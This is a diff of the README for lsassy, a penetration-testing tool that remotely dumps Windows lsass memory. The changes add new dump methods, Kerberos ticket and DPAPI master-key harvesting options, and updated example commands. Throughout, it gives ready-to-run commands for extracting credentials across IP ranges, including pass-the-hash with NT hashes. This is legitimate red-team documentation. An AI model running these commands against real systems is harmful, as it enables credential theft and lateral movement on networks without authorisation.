@@ -1,8 +1,7 @@
 # lsassy
-
-[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=3.1.1&x2=0)](https://pypi.org/project/lsassy/)
+[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.16&x2=0)](https://pypi.org/project/lsassy)
 [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
-[![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+[![Tests](https://github.com/hackndo/lsassy/actions/workflows/lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=lsassy)
 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
@@ -19,7 +18,7 @@ This tool uses [impacket](https://github.com/SecureAuthCorp/impacket) project to
 | [Advanced usage](#advanced-usage)            | Advanced lsassy usage with params explaination          |
 | [Add dump method](#add-dump-method)          | How to add a custom lsass dump method                   |
 | [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |
-| [Official Discord](#official-discord-channel)| Official Discord channel                                |
+| [Official Discord](#official-discord)        | Official Discord server                                 |
 
 ## Warning
 
@@ -48,8 +47,8 @@ python3 setup.py install
 **lsassy** works out of the box on multiple targets (IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets)
 
 ```bash
-lsassy [-d domain] -u user -p password targets
-lsassy [-d domain] -u user -H [LM:]NT targets
+lsassy [-d domain] -u pixis -p P4ssw0rd targets
+lsassy [-d domain] -u pixis -H [LM:]NT targets
 ```
 
 By default, lsassy will try to dump lsass remotely using `comsvcs.dll` method, either via WMI or via a remote scheduled task.
@@ -66,10 +65,10 @@ lsassy -k targets
 ### Examples
 
 ```bash
- lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.0/24
- lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.1-10
- lsassy -d adsec.local -u pixis -p p4ssw0rd hosts.txt
- lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.1-192.168.1.10
+ lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/24
+ lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-10
+ lsassy -d hackn.lab -u pixis -p P4ssw0rd hosts.txt
+ lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-192.168.1.10
 ```
 
 ## Advanced Usage
@@ -143,6 +142,7 @@ Dumping methods (`-m` or `--method`)
 * procdump_embedded
 * dumpert
 * dumpertdll
+* nativedump
 * ppldump
 * ppldump_embedded
 * mirrordump
@@ -151,6 +151,8 @@ Dumping methods (`-m` or `--method`)
 * EDRSandBlast
 * nanodump
 * rdrleakdiag
+* silentprocessexit
+* sqldumper
 
 #### comsvcs method
 
@@ -163,6 +165,10 @@ This method uploads **procdump.exe** from SysInternals to dump **lsass** process
 #### Dumpert method
 
 This method uploads **dumpert.exe** or **dumpert.dll** from [outflanknl](https://github.com/outflanknl/Dumpert) to dump **lsass** process using syscalls.
+
+#### Native Dump
+
+This methods uploads **NativeDump.exe** from [ricardojoserf](https://github.com/ricardojoserf/NativeDump) to dump **lsass** process using only NTAPIs.
 
 #### Ppldump
 
@@ -187,9 +193,9 @@ For some dumping method, options are required, like procdump or dumpert path. Th
 For example:
 
 ```bash
-lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m procdump    -O procdump_path=/opt/Sysinternals/procdump.exe
-lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m dumpert     -O dumpert_path=/opt/dumpert.exe
-lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m dumpertdll  -O dumpertdll_path=/opt/dumpert.dll
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -m procdump    -O procdump_path=/opt/Sysinternals/procdump.exe
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -m dumpert     -O dumpert_path=/opt/dumpert.exe
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -m dumpertdll  -O dumpertdll_path=/opt/dumpert.dll
 ```
 
 #### Parse only
@@ -201,15 +207,31 @@ Note that if you choose this method, the **remote lsass dump won't be deleted**.
 For example:
 
 ```bash
-lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local --parse-only --dump-path "/Windows/Temp" --dump-name "lsass.dmp"
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab --parse-only --dump-path "/Windows/Temp" --dump-name "lsass.dmp"
+```
+
+#### Keep dump
+
+If you don't want the dump to be automatically deleted after lsassy run, you can use `--keep-dump`.
+
+```
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab --keep-dump
 ```
 
 ### Kerberos tickets harvesting
 
-You can extract in-memory Kerberos tickets by using `-K [directory]` or `--kerberos-dir [directory]` parameter. It will extract and save Kerberos tickets in `kirbi` format in the provided output directory. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.
+Kerberos tickets will be extracted and saved to `$HOME/.config/lsassy/tickets` in `ccache` format. You can specify output directory using `-K [directory]` or `--kerberos-dir [directory]` parameter. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.
 
 ```bash
-lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -K '/tmp/kerberos_tickets'
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -K '/tmp/kerberos_tickets'
+```
+
+### DPAPI Master Keys harvesting
+
+DPAPI Master Keys will be extracted and saved to `$HOME/.config/lsassy/masterkeys.txt` in `{GUID}:SHA1` format. You can specify masterkey file path using `-M [path]` or `--masterkeys-file [path]` parameter. If the file path doesn't exist, the tool will attempt to create it before creating the file.
+
+```bash
+lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -M '/tmp/keys.txt'
 ```
 
 ### Authentication methods
@@ -222,10 +244,10 @@ First and most obvious one is by using clear text credentials. It can either be 
 
 ```bash
 ## Local user
-lsassy -u pixis -p p4ssw0rd server01.adsec.local
+lsassy -u pixis -p P4ssw0rd server01.hackn.lab
 
 ## Domain user
-lsassy -d adsec.local -u jsnow -p WinterIsComing server01.adsec.local
+lsassy -d hackn.lab -u jsnow -p WinterIsComing server01.hackn.lab
 ```
 
 #### Pass-the-hash
@@ -233,12 +255,12 @@ lsassy -d adsec.local -u jsnow -p WinterIsComing server01.adsec.local
 It is also possible to authenticate using user's NT hash. You can either provide LM:NT or only NT version.
 
 ```bash
-lsassy -d adsec.local -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.adsec.local
+lsassy -d hackn.lab -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
 aad3b435b51404eeaad3b435b51404ee
 
 ## Or
 
-lsassy -d adsec.local -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.adsec.local
+lsassy -d hackn.lab -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
 ```
 
 #### Kerberos
@@ -246,7 +268,7 @@ lsassy -d adsec.local -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f72
 You can also authenticate using Kerberos. For this to work, you will need to have a valid ticket saved on disk, and ticket's path needs to be provided in `KRB5CCNAME` environment variable. For testing purpose, this can be achieved using impacket **getTGT.py** tool.
 
 ```bash
-getTGT.py adsec.local/jsnow:WinterIsComing -dc-ip dc01.adsec.local
+getTGT.py hackn.lab/jsnow:WinterIsComing -dc-ip dc01.hackn.lab
 ```
 
 This command will request a TGT and save it in `jsnow.ccache` file.
@@ -260,10 +282,10 @@ export KRB5CCNAME="/home/pixis/jsnow.ccache"
 When it's correctly configured, you should be able to use that ticket for authentication using `-k` parameter. Since you're using this ticket, you don't need to provide other authentication information anymore.
 
 ```bash
-lsassy -k server01.adsec.local
+lsassy -k server01.hackn.lab
 ```
 
-Note that for this to work, you will need a valid DNS configuration, either dynamic with a valid DNS server, or static using `hosts` file. Moreover, you should always use FQDN when generating tickets and using **lsassy**, i.e. use `server01.adsec.local` instead of `server01`.
+Note that for this to work, you will need a valid DNS configuration, either dynamic with a valid DNS server, or static using `hosts` file. Moreover, you should always use FQDN when generating tickets and using **lsassy**, i.e. use `server01.hackn.lab` instead of `server01`.
 
 ### Output
 
@@ -276,14 +298,14 @@ Note that for this to work, you will need a valid DNS configuration, either dyna
 Default format, nice and clean credentials are displayed with golden colors. In credz we trust.
 
 ```
-lsassy [-d domain] -u user -p password --format pretty targets
+lsassy [-d domain] -u pixis -p P4ssw0rd --format pretty targets
 ```
 
 ##### Json
 
 Displays result in json format. Can be useful when called from a script
 ```
-lsassy [-d domain] -u user -p password --format json targets
+lsassy [-d domain] -u pixis -p P4ssw0rd --format json targets
 ```
 
 ##### Grep
@@ -291,28 +313,40 @@ lsassy [-d domain] -u user -p password --format json targets
 Grepable output that can be useful in one-liners
 
 ```
-lsassy [-d domain] -u user -p password --format grep targets
+lsassy [-d domain] -u pixis -p P4ssw0rd --format grep targets
 ```
 
 ##### None
 
 Doesn't display the result. Useful when using `--outfile`
 ```
-lsassy [-d domain] -u user -p password targets --format none
+lsassy [-d domain] -u pixis -p P4ssw0rd targets --format none
 ```
 
 #### Save in a file
 
 Saves the result in a grepable format in provided file (`--outfile` or `-o`)
 ```
-lsassy [-d domain] -u user -p password targets --format json --outfile /tmp/credentials.txt
+lsassy [-d domain] -u pixis -p P4ssw0rd targets --format json --outfile /tmp/credentials.txt
 ```
 
 #### Results filtering
 
 If you want to only get users credentials, filtering out computers credentials, you can use `--users` flag
 ```
-lsassy [-d domain] -u user -p password targets --users
+lsassy [-d domain] -u pixis -p P4ssw0rd targets --users
+```
+
+If you don't want tickets to be exported, you can use `--no-tickets` flag
+
+```
+lsassy [-d domain] -u pixis -p P4ssw0rd targets --no-tickets
+```
+
+If you don't want masterkeys to be exported, you can use `--no-masterkeys` flag
+
+```
+lsassy [-d domain] -u pixis -p P4ssw0rd targets --no-masterkeys
 ```
 
 #### Thread management
@@ -320,7 +354,7 @@ lsassy [-d domain] -u user -p password targets --users
 You can decide how many thread you want to use \[1-256\] using `--threads` parameter.
 
 ```
-lsassy [-d domain] -u user -p password targets --threads 32
+lsassy [-d domain] -u pixis -p P4ssw0rd targets --threads 32
 ```
 
 
@@ -453,11 +487,19 @@ You can check dummy class for more comments and/or informations.
 * [th3m4ks](https://twitter.com/th3m4ks) and [Qazeer](https://twitter.com/_Qazeer) for [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 * [s4ntiago_p](https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/nanodump)
 * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique](https://twitter.com/0gtweet/status/1299071304805560321)
+* [Luis Rocha](https://twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/countuponsec/status/910969424215232518)
+* [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://github.com/deepinstinct/LsassSilentProcessExit)
 
-## Official Discord Channel
+## Official Discord
 
-[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/sEkn3aa)
+[https://discord.hackndo.com](https://discord.hackndo.com)
 
 ## Known bugs
 
 * Compiled versions don't include table_output because of some weird error with rich library
+
+## Star History
+
+<a href="https://github.com/hackndo/lsassy/stargazers">
+<img width="500" alt="Star History Chart" src="https://api.star-history.com/svg?repos=hackndo/lsassy&type=Date">
+</a> 
